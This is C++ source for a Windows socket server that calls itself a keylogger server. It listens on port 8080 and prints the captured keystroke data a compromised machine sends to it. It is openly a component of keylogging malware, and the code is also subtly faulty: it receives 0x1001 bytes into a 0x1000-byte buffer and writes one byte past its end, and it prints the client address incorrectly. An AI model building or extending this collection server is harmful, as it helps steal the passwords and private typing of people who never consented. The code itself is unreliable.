#include <winsock2.h>
#include <stdio.h>
using namespace std;
/**
    this is a temporary server used for testing, future changes will be established 
*/
int main()
{
    WSADATA WSA;
    SOCKET Listener, acceptedTarget;
    SOCKADDR_IN server, target;
    int cL;
    char* buffer = (char*)malloc(0x1000);
    fprintf(stderr ,"Welcome to the keylogger server version 0.1.0, \n momentarily the listener should be established!\n");
    fprintf(stderr ,"\t[*] Initalizing socket...\n");
    if (WSAStartup(MAKEWORD(2,2), &WSA) !=0)
    {
        fprintf(stderr ,"\t\t[*] WSAstartup has failed with Error Code: %d",WSAGetLastError());
        return -1;
    }
    fprintf(stderr ,"\t\t[*] WSA startup complete!\n\t[*] creating socket!");
    if((Listener = socket(AF_INET,SOCK_STREAM,0))==INVALID_SOCKET)
    {
        fprintf(stderr ,"Error in creating socket, error code: %d", WSAGetLastError());
        return -1;
    }
    server.sin_family =AF_INET;
    server.sin_addr.S_un.S_addr = INADDR_ANY;
    server.sin_port=htons(8080);
    fprintf(stderr ,"\n\t\t[*] attempting to bind socket to port 8080: ");
    if(bind(Listener,(struct sockaddr*)&server,sizeof(server))== SOCKET_ERROR)
    {
        fprintf(stderr ,"failed to bind socket, Error code %d", WSAGetLastError());
        return -1;
    }
    fprintf(stderr, "accepted\n\t\t[*]Listening: ");

    listen(Listener,3);
    cL=sizeof(target);
    acceptedTarget = accept(Listener,(SOCKADDR*)&target,&cL);
    if(acceptedTarget==INVALID_SOCKET)
    {
        fprintf(stderr ,"\n\t\t[*] error connecting");
        return -1;
    }
    fprintf(stderr ," connection accepted\n[*] IP ADDRESS %d",htonl(target.sin_addr.S_un.S_addr));
    while(recv(acceptedTarget,buffer,0x1001,0)!=  SOCKET_ERROR)
    {
       
        *(buffer+0x1000)=0x00;
        printf("%s",buffer);
    }
    printf("\n</KeyLoggerMetaData>\n");
    closesocket(acceptedTarget);
    WSACleanup();
    return 0;
}
